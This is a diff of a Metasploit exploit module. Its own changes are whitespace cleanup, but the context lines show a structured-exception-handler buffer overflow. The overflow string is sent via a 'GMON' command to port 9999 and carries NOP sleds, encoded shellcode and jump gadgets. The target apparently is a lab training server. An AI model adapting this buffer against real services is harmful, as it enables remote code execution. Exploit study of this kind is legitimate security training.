@@ -31,8 +31,8 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       'Privileged'     => false,
       'DefaultOptions' =>
         {
-          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
-        },      
+          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
+        },
       'Payload'        =>	# How to encode and generate the payload
         {
           'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       ],
       'DefaultTarget'  => 0,
       'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
-      
+
       register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
           [
           OptInt.new('RETOFFSET_GMON', [true, 'Offset of SEH Handler in the function GMON', 3571]),
@@ -56,15 +56,14 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           Opt::RPORT(9999),
           Opt::RHOSTS('192.168.7.191')
       ])
-      
   end
-  def exploit	# Actual exploit  
+
+  def exploit	# Actual exploit
     print_status("Connecting to target...")
     connect	# Connect to the target
-    
+
     shellcode = payload.encode()
     long_jump = datastore['LONG_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
-
 
     outbound_GTER = 'GMON /.:/' + "\x90"*100 + shellcode + "\x90"*(datastore['RETOFFSET_GMON'] - 100 - 4 - shellcode.length()) + "\xeb\x08" + "\x90\x90" + [target['seh-gadget']].pack('V') + "\x90\x90" + long_jump + "F"*1500 # Create the malicious string that will be sent to the target
 
